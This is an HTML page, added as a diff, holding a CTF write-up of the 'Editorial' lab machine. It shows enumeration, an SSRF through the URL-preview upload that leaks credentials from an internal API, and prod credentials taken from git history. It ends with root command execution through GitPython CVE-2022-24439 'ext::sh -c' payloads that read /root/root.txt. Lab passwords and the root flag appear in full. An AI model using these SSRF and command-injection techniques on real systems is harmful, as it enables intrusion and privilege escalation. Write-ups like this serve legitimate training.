@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Editorial</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Editorial Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*W3_hq8287wk4RKmsMmJlwA.png">
+            <p class="paragraph">
+                Hello, this is my second writeup, I hope you learn much from and enjoy this writeup.
+            </p>
+            <h2>Enumeration</h2>
+            <p class="paragraph">
+                - NMAP
+                <p class="script-container">
+                    ┌──(gh0st@kali)-[~]<br>
+                    └─$ nmap -p- -sC -sV 10.10.11.20<br>
+                    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 17:29 WIB<br>
+                    Nmap scan report for editorial.htb (10.10.11.20)<br>
+                    Host is up (0.042s latency).<br>
+                    Not shown: 65533 closed tcp ports (reset)<br>
+                    PORT   STATE SERVICE VERSION<br>
+                    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>
+                    | ssh-hostkey: <br>
+                    |   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)<br>
+                    |_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)<br>
+                    80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>
+                    |_http-title: Editorial Tiempo Arriba<br>
+                    |_http-server-header: nginx/1.18.0 (Ubuntu)<br>
+                    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
+                    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+                    Nmap done: 1 IP address (1 host up) scanned in 42.08 seconds<br>
+                </p>
+                The machine running a website on port 80. port 80 redirect to editorial.htb.<br>Let’s add this domain to /etc/hosts file:
+                <p class="script-container">
+                    10.10.11.20 editorial.htb
+                </p>
+                <h3>Website — Port: 80</h3>
+                - URL : http://editorial.htb/
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Qbje1VKU5Y3bx4rQepXkvQ.png">
+            <p class="paragraph">
+                In this page, we have 2 links /upload and /about from the header.<br>Next we will try to brute force the directory using FFUF.
+                <p class="script-container">
+                    ┌──(gh0st@kali)-[~]<br>
+                    └─$ ffuf -w ~/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://editorial.htb/FUZZ<br>
+                    &nbsp;&nbsp;/'___\  /'___\           /'___\ <br>
+                    &nbsp;&nbsp;/\ \__/ /\ \__/  __  __  /\ \__/<br>
+                    &nbsp;&nbsp;\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>
+                    &nbsp;&nbsp;\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>
+                    &nbsp;&nbsp;\ \_\   \ \_\  \ \____/  \ \_\<br>
+                    &nbsp;&nbsp;\/_/    \/_/   \/___/    \/_/<br>
+                    &nbsp;v2.1.0-dev<br>
+                    ________________________________________________<br>
+                    :: Method&nbsp;&nbsp;: GET<br>
+                    :: URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: http://editorial.htb/FUZZ<br>
+                    :: Wordlist       : FUZZ: /home/nyctophle/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt<br>
+                    :: Follow redirects : false<br>
+                    :: Calibration      : false<br>
+                    :: Timeout          : 10<br>
+                    :: Threads          : 40<br>
+                    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500<br>
+                    ________________________________________________<br>
+                    about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 81ms]<br>
+                    upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 43ms]<br>
+                                            [Status: 200, Size: 8577, Words: 1774, Lines: 177, Duration: 41ms]<br>
+                    :: Progress: [87650/87650] :: Job [1/1] :: 238 req/sec :: Duration: [0:02:08] :: Errors: 0 ::<br>
+                </p>
+                We don’t see any other directories besides these 2 directories. Let’s open upload directory.<br><br>
+                - URL : http://editorial.htb/upload
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*CtHzfzkdEAXO7KaLJDcOeA.png">
+            <p class="paragraph">
+                This page is interesting, we can preview an image from a file or url. Let’s try to upload a php reverse shell.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*-Yfc8_aPE7WgxMqTZTZDiA.png">
+            <p class="paragraph">
+                Click preview, and open the image in a new tab.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*R98mjNoGCxobQSAQYMEQ0A.png">
+            <p class="paragraph">
+                <p class="script-container">
+                    ┌──(gh0st@kali)-[~/Downloads]<br>
+                    └─$ exiftool 10aa20ca-80cf-4b5e-8e1b-0af97fee6921<br>
+                    ExifTool Version Number&nbsp;&nbsp;&nbsp;&nbsp;: 12.76<br>
+                    File Name&nbsp;&nbsp;&nbsp;&nbsp;: 10aa20ca-80cf-4b5e-8e1b-0af97fee6921<br>
+                    Directory&nbsp;&nbsp;&nbsp;&nbsp;: .<br>
+                    File Size&nbsp;&nbsp;&nbsp;&nbsp;: 50 kB<br>
+                    File Modification Date/Time&nbsp;&nbsp;: 2024:06:16 18:16:44+07:00<br>
+                    File Access Date/Time&nbsp;&nbsp;: 2024:06:16 18:16:46+07:00<br>
+                    File Inode Change Date/Time&nbsp;&nbsp;: 2024:06:16 18:16:44+07:00<br>
+                    File Permissions&nbsp;&nbsp;&nbsp;&nbsp;: -rw-rw-r--<br>
+                    File Type&nbsp;&nbsp;&nbsp;&nbsp;: JPEG<br>
+                    File Type Extension&nbsp;&nbsp;&nbsp;&nbsp;: jpg<br>
+                    MIME Type&nbsp;&nbsp;&nbsp;&nbsp;: image/jpeg<br>
+                    JFIF Version&nbsp;&nbsp;&nbsp;&nbsp;: 1.01<br>
+                    Resolution Unit&nbsp;&nbsp;&nbsp;&nbsp;: None<br>
+                    X Resolution&nbsp;&nbsp;&nbsp;&nbsp;: 1<br>
+                    Y Resolution&nbsp;&nbsp;&nbsp;&nbsp;: 1<br>
+                    Image Width&nbsp;&nbsp;&nbsp;&nbsp;: 1680<br>
+                    Image Height&nbsp;&nbsp;&nbsp;&nbsp;: 1050<br>
+                    Encoding Process&nbsp;&nbsp;&nbsp;&nbsp;: Baseline DCT, Huffman coding<br>
+                    Bits Per Sample &nbsp;&nbsp;&nbsp;&nbsp;: 8<br>
+                    Color Components &nbsp;&nbsp;&nbsp;&nbsp;: 3<br>
+                    Y Cb Cr Sub Sampling&nbsp;&nbsp;&nbsp;&nbsp;: YCbCr4:2:0 (2 2)<br>
+                    Image Size&nbsp;&nbsp;&nbsp;&nbsp;: 1680x1050<br>
+                    Megapixels&nbsp;&nbsp;&nbsp;&nbsp;: 1.8<br>
+                </p>
+                Nothing interesting, we don’t see any software used here.<br>
+                <h2>SSRF VULNERABILITY</h2><br><br>
+                The interesting part is the url preview, this feature might be vulnerable to SSRF. First, open your burpsuite to analyze the response.<br><br>
+                Let’s insert localhost address.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*qRd0VvhooYGysU8lGYhJ6Q.png">
+            <p class="paragraph">
+            - Request :
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Ifm4AbgoSDHtPDMcfsUAcQ.png">
+            <p class="paragraph">
+            - Response :
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*n5-kYrLF9wCv-L1xqvSDYg.png">
+            <p class="paragraph">
+                The response is showing a image directory location.<br><br>
+                This machine might have another port running locally, we can bruteforce the port by using burp intruder, and add a port number from 1–65535. Let’s do it!
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*aVXSd6gopBYa4v8Asu4wIg.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*R6xqFx6Bgr1FoWz17m37CA.png">
+            <p class="paragraph">
+                Result :<br><br>
+                After completed, use filter to check the different result on the response.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*5liGXtiyVaRq-V-KNzsRMA.png">
+            <p class="paragraph">
+                As we can see, port 5000 return different result. lets see the response from port 5000.
+                <p class="script-container">
+                    HTTP/1.1 200 OK<br>
+                    Server: nginx/1.18.0 (Ubuntu)<br>
+                    Date: Sun, 16 Jun 2024 11:33:07 GMT<br>
+                    Content-Type: text/html; charset=utf-8<br>
+                    Connection: keep-alive<br>
+                    Content-Length: 51<br><br>
+                    static/uploads/eb8e7bff-150e-4d99-be89-fb64f1e3a937<br>
+                </p>
+                Nice, let’s download this file and read the file.
+                <p class="script-container">
+                    ┌──(gh0st@kali)-[~/Downloads]<br>
+                    └─$ cat eb8e7bff-150e-4d99-be89-fb64f1e3a937 | jq  <br>
+                    {<br>
+                    "messages": [<br>
+                        {<br>
+                        "promotions": {<br>
+                            "description": "Retrieve a list of all the promotions in our library.",<br>
+                            "endpoint": "/api/latest/metadata/messages/promos",<br>
+                            "methods": "GET"<br>
+                        }<br>
+                        },<br>
+                        {<br>
+                        "coupons": {<br>
+                            "description": "Retrieve the list of coupons to use in our library.",<br>
+                            "endpoint": "/api/latest/metadata/messages/coupons",<br>
+                            "methods": "GET"<br>
+                        }<br>
+                        },<br>
+                        {<br>
+                        "new_authors": {<br>
+                            "description": "Retrieve the welcome message sended to our new authors.",<br>
+                            "endpoint": "/api/latest/metadata/messages/authors",<br>
+                            "methods": "GET"<br>
+                        }<br>
+                        },<br>
+                        {<br>
+                        "platform_use": {<br>
+                            "description": "Retrieve examples of how to use the platform.",<br>
+                            "endpoint": "/api/latest/metadata/messages/how_to_use_platform",<br>
+                            "methods": "GET"<br>
+                        }<br>
+                        }<br>
+                    ],<br>
+                    "version": [<br>
+                        {<br>
+                        "changelog": {<br>
+                            "description": "Retrieve a list of all the versions and updates of the api.",<br>
+                            "endpoint": "/api/latest/metadata/changelog",<br>
+                            "methods": "GET"<br>
+                        }<br>
+                        },<br>
+                        {<br>
+                        "latest": {<br>
+                            "description": "Retrieve the last version of api.",<br>
+                            "endpoint": "/api/latest/metadata",<br>
+                            "methods": "GET"<br>
+                        }<br>
+                        }<br>
+                    ]<br>
+                    }<br>
+                </p>
+                By looking at this file, we know that local port 5000 has an api endpoint.<br>
+                <h3>SSH AS DEV</h3>
+                As we know, we can access local port 5000 and we know the api endpoint from local port 5000. We can send a request to the api endpoint from burp, and then we can read the file contents.<br><br>
+                - Burp Request :
+                <p class="script-container">
+                    POST /upload-cover HTTP/1.1<br>
+                    Host: editorial.htb<br>
+                    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br>
+                    Accept: */*<br>
+                    Accept-Language: en-US,en;q=0.5<br>
+                    Accept-Encoding: gzip, deflate, br<br>
+                    Content-Type: multipart/form-data; boundary=---------------------------312307498531384090733427943819<br>
+                    Content-Length: 401<br>
+                    Origin: http://editorial.htb<br>
+                    Connection: close<br>
+                    Referer: http://editorial.htb/upload<br><br>
+
+                    -----------------------------312307498531384090733427943819<br>
+                    Content-Disposition: form-data; name="bookurl"<br>
+                    http://127.0.0.1:5000/api/latest/metadata/messages/authors<br>
+                    -----------------------------312307498531384090733427943819<br>
+                    Content-Disposition: form-data; name="bookfile"; filename=""<br>
+                    Content-Type: application/octet-stream<br><br>
+
+                    -----------------------------312307498531384090733427943819--
+                </p>
+                - Burp Response :
+                <p class="script-container">
+                    HTTP/1.1 200 OK<br>
+                    Server: nginx/1.18.0 (Ubuntu)<br>
+                    Date: Sun, 16 Jun 2024 12:07:12 GMT<br>
+                    Content-Type: text/html; charset=utf-8<br>
+                    Connection: close<br>
+                    Content-Length: 51<br>
+
+
+                    static/uploads/19d52676-86a3-4870-88b8-294de9842a77<br>
+                </p>
+                - File Contents :
+                <p class="script-container">
+                    ┌──(gh0st@kali)-[~/Downloads]<br>
+                    └─$ cat 19d52676-86a3-4870-88b8-294de9842a77 | jq<br>
+                    {<br>
+                    "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."<br>
+                    }<br>
+                </p>
+                The file contents has a credentials of user dev. we can use this credentials in ssh.
+                <p class="script-container">
+                    ┌──(gh0st@kali)-[~/Downloads]<br>
+                    └─$ ssh dev@editorial.htb<br>
+                    dev@editorial.htb's password: <br>
+                    Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)<br>
+                    * Documentation:  https://help.ubuntu.com<br>
+                    * Management:     https://landscape.canonical.com<br>
+                    * Support:        https://ubuntu.com/pro<br>
+                    System information as of Sun Jun 16 12:12:50 PM UTC 2024<br>
+                    System load:  0.0               Processes:             227<br>
+                    Usage of /:   62.1% of 6.35GB   Users logged in:       1<br>
+                    Memory usage: 19%               IPv4 address for eth0: 10.10.11.20<br>
+                    Swap usage:   0%<br><br>
+
+                    Expanded Security Maintenance for Applications is not enabled.<br>
+                    0 updates can be applied immediately.<br>
+                    Enable ESM Apps to receive additional future security updates.<br>
+                    See https://ubuntu.com/esm or run: sudo pro status<br><br>
+
+                    Last login: Sun Jun 16 11:05:21 2024 from 10.10.14.6<br>
+                    dev@editorial:~$
+                </p>
+                USER FLAG
+                <p class="script-container">
+                    dev@editorial:~$ ls -la<br>
+                    total 40<br>
+                    drwxr-x--- 5 dev  dev  4096 Jun 16 11:44 .<br>
+                    drwxr-xr-x 4 root root 4096 Jun  5 14:36 ..<br>
+                    drwxrwxr-x 5 dev  dev  4096 Jun 16 08:46 apps<br>
+                    lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null<br>
+                    -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout<br>
+                    -rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc<br>
+                    drwx------ 2 dev  dev  4096 Jun  5 14:36 .cache<br>
+                    drwx------ 3 dev  dev  4096 Jun 16 08:22 .gnupg<br>
+                    -rw------- 1 dev  dev    20 Jun 16 11:44 .lesshst<br>
+                    -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile<br>
+                    -rw-r----- 1 root dev    33 Jun 16 05:41 user.txt<br>
+                    dev@editorial:~$ cat user.txt <br>
+                    xxxx<br>
+                    dev@editorial:~$
+                </p>
+                USER PROD<br><br>
+                - Enumeration<br><br>
+                By looking at home directory, we can see apps folder.
+                <p class="script-container">
+                    dev@editorial:~$ ls -la<br>
+                    total 40<br>
+                    drwxr-x--- 5 dev  dev  4096 Jun 16 12:18 .<br>
+                    drwxr-xr-x 4 root root 4096 Jun  5 14:36 ..<br>
+                    drwxrwxr-x 5 dev  dev  4096 Jun 16 08:46 apps<br>
+                    lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null<br>
+                    -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout<br>
+                    -rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc<br>
+                    drwx------ 2 dev  dev  4096 Jun  5 14:36 .cache<br>
+                    drwx------ 3 dev  dev  4096 Jun 16 08:22 .gnupg<br>
+                    -rw------- 1 dev  dev    20 Jun 16 12:18 .lesshst<br>
+                    -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile<br>
+                    -rw-r----- 1 root dev    33 Jun 16 05:41 user.txt<br>
+                </p>
+                - Git Enumeration<br><br>
+                apps folder contains .git
+                <p class="script-container">
+                    dev@editorial:~/apps$ ls -la<br>
+                    total 12<br>
+                    drwxrwxr-x 3 dev dev 4096 Jun 16 12:27 .<br>
+                    drwxr-x--- 5 dev dev 4096 Jun 16 12:18 ..<br>
+                    drwxr-xr-x 8 dev dev 4096 Jun 16 11:43 .git<br>
+                </p>
+                We can use git log to shows a list of all the commits made to a repository.
+                <p class="script-container">
+                    dev@editorial:~/apps$ git log<br>
+                    commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)<br>
+                    Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb><br>
+                    Date:   Sun Apr 30 21:04:21 2023 -0500<br>
+                    fix: bugfix in api port endpoint<br>
+                    commit dfef9f20e57d730b7d71967582035925d57ad883<br>
+                    Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb><br>
+                    Date:   Sun Apr 30 21:01:11 2023 -0500<br>
+                        change: remove debug and update api port<br>
+                    commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae<br>
+                    Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb><br>
+                    Date:   Sun Apr 30 20:55:08 2023 -0500<br>
+                        change(api): downgrading prod to dev<br><br>
+                        
+                        * To use development environment.<br>
+                    commit 1e84a036b2f33c59e2390730699a488c65643d28<br>
+                    Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb><br>
+                    Date:   Sun Apr 30 20:51:10 2023 -0500<br>
+                        feat: create api to editorial info<br><br>
+                        
+                        * It (will) contains internal info about the editorial, this enable<br>
+                        faster access to information.<br>
+                    commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8<br>
+                    Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb><br>
+                    Date:   Sun Apr 30 20:48:43 2023 -0500<br>
+                        feat: create editorial app<br><br>
+                        
+                        * This contains the base of this project.<br>
+                        * Also we add a feature to enable to external authors send us their<br>
+                        books and validate a future post in our editorial.<br>
+                </p>
+                - Prod Credentials<br><br>
+                Use git show 1e84a036b2f33c59e2390730699a488c65643d28 to read the contents before downgraded to dev. Scroll down to read the prod user credentials.
+                <p class="script-container">
+                    dev@editorial:~/apps$ git show 1e84a036b2f33c59e2390730699a488c65643d28<br>
+                    commit 1e84a036b2f33c59e2390730699a488c65643d28<br>
+                    Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb><br>
+                    Date:   Sun Apr 30 20:51:10 2023 -0500<br>
+                    ..........................................................................<br>
+                    +# -- : (development) mail message to new authors<br>
+                    +@app.route(api_route + '/authors/message', methods=['GET'])<br>
+                    +def api_mail_new_authors():<br>
+                    +    return jsonify({<br>
+                    +        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.<br>\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."<br>
+                    +    }) # TODO: replace dev credentials when checks pass<br>
+                    ..........................................................................<br>
+                </p>
+                <p class="script-container">
+                    dev@editorial:~/apps$ su prod<br>
+                    Password: <br>
+                    prod@editorial:/home/dev/apps$<br>
+                </p>
+                ROOT<br><br>
+                - Enumeration<br><br>
+                user prod has a sudo privilege.
+                <p class="script-container">
+                    prod@editorial:~$ sudo -l<br>
+                    [sudo] password for prod: <br>
+                    Matching Defaults entries for prod on editorial:<br>
+                        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>
+
+                    User prod may run the following commands on editorial:<br>
+                        (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+                </p>
+                - Read the Code<br><br>
+                Let’s see what clone_prod_change.py do.
+                <p class="script-container">
+                    prod@editorial:~$ cd /opt/internal_apps/clone_changes/<br>
+                    prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py <br>
+                    #!/usr/bin/python3<br><br>
+
+                    import os<br>
+                    import sys<br>
+                    from git import Repo<br><br>
+
+                    os.chdir('/opt/internal_apps/clone_changes')<br><br>
+
+                    url_to_clone = sys.argv[1]<br>
+                    r = Repo.init('', bare=True)<br>
+                    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])<br>
+                </p>
+                - Vulnerable Library<br><br>
+                This code is using git library to perform clone operation. Next, we will check the library version using pip3 list.
+                <p class="script-container">
+                    GitPython&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.1.29
+                </p>
+                - Exploit the Vulnerability<br><br>
+                This version is vulnerable to remote code execution. Here is the POC CVE-2022–24439. The POC is making a file named pwned in /tmp folder.
+                <p class="script-container">
+                    prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'<br>
+                    Traceback (most recent call last):<br>
+                    File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module><br>
+                        r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])<br>
+                    File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from<br>
+                        return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)<br>
+                    File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone<br>
+                        finalize_process(proc, stderr=stderr)<br>
+                    File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process<br>
+                        proc.wait(**kwargs)<br>
+                    File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait<br>
+                        raise GitCommandError(remove_password_if_present(self.args), status, errstr)<br>
+                    git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)<br>
+                    cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes<br>
+                    stderr: 'Cloning into 'new_changes'...<br>
+                    fatal: Could not read from remote repository.<br><br>
+
+                    Please make sure you have the correct access rights<br>
+                    and the repository exists.<br>
+                </p>
+                This command has executed successfully by root user.<br><br>
+                - Root.txt<br><br>
+                Afterwards, we can read the /root/root.txt by doing this :
+                <p class="script-container">
+                    prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'<br>
+                    prod@editorial:~$ cat /tmp/root <br>
+                    d070f47eacbf26f4bf15e08ae2c37c2c
+                </p>
+                Thanks 4 reading!
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
